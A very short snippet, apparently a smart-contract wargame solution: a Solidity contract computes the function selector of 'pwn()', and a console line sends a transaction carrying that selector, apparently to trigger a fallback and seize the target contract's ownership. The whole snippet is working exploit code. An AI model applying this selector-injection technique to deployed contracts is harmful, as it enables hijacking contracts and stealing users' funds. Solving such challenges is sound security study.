pragma solidity ^0.4.18;

contract Hash {
    function getHash () public pure returns (bytes4) {
        return bytes4(keccak256("pwn()"));
    }
}


contract.sendTransaction({data: "0xdd365b8b"})
